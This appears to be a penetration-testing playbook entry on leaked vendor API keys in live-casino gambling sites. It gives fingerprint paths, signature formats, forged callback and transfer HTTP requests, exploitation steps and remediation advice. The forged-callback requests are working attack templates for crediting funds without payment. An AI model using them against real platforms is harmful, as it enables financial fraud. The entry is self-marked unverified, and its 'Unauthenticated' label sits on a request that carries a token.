---
title: Third-party game / live-casino API key disclosure and callback forgery
cve: None (implementation flaw)
severity: critical
cvss: 8.8
product: Turnkey sites integrating AG / BBIN / OB and other vendors
versions: Any
ports: 80, 443
keywords: game vendor, api key, live casino, crediting, callback, transfer
entry: Obtain vendor key from the frontend and forge /api/game/callback to credit funds
verified: false
sources: Compiled from public sources (implementation flaws; no CVE; use each vendor's integration documentation for fields/algorithms)
---

## Fingerprints

```
/api/game/balance?platform=AG     /api/game/transfer
/api/game/callback                /api/game/launch?platform=BBIN
agent, secret, apiKey, and vendorId appear in frontend /config.js /env.js /static/js/*.map
```

## Prerequisites

- An authorized account; access to frontend assets (most sites bundle vendor parameters into the H5 package).
- Callback signature formats vary by vendor; **follow the integration documentation**. Three common forms (do not force one vendor's fields onto another):

```
AG family    : params=<a=b&c=d>&key=<secret>       → sign = MD5(params+key) or HMAC-SHA256
BBIN family  : form fields + key                   → sign = MD5(sorted concatenation + key)
OB / custom  : JSON body + header X-Sign           → HMAC(body, secret)
General supporting evidence: account / amount / orderNo / sign / key appear together in callbacks
Sorting/encoding: most vendors require ascending key order, one URL-encoding pass, lowercase signatures, and a 5-10 minute timestamp window (follow integration documentation)
```

## PoC

```http
### 1) Unauthenticated transfer/crediting (move your own balance into the game or back)
POST /api/game/transfer HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{"platform":"AG","amount":100,"direction":"in"}

### 2) Forge a vendor callback to credit your own account (negative control first: check whether an invalid sign is rejected)
POST /api/game/callback HTTP/1.1
Content-Type: application/x-www-form-urlencoded

account=<your-account>&amount=1000&orderNo=TEST123&sign=whatever
#  Expected: 200/success ⇒ no signature verification; 401/403 ⇒ verification exists, retry with a correct signature using the leaked key
```

## Exploitation Steps

1. Extract `vendor key`, `agent`, and `apiUrl` from the frontend bundle / sourcemap (this step often succeeds immediately).
2. **Negative control first**: change one character in `sign` — rejection (invalid signature) means verification exists; sign correctly using the leaked key; acceptance means directly record "no signature verification".
3. If signature verification exists, also check the **source IP**: are callbacks accepted only from vendor egress ranges (test with your own server within the authorized scope and check for rejection)?
4. Check `transfer` for server-side signatures/balance validation; without validation, balances can be moved in both directions.
5. Chain: credit via `callback` → place a bet → use `withdraw-approval-idor.md` to verify financial impact; quantify using "state change + balance change both confirmed" and "upper bound = per-transaction amount × replay count" from `payment-notify-forgery.md`.
6. Evidence: request + before/after balances; use only your own account; void test orders.

## Remediation and Mitigation (Hardening)

- Store vendor key/secret only server-side, never in frontend bundles; H5 receives only temporary tokens.
- Require callback signature verification (per vendor documentation) + source IP allowlisting + idempotency (unique orderNo).
- Authenticate transfers in both directions (member token + server-side signature).

## References

- Vendor callback signature-verification documentation (general AG/BBIN/OB patterns); OWASP A04.
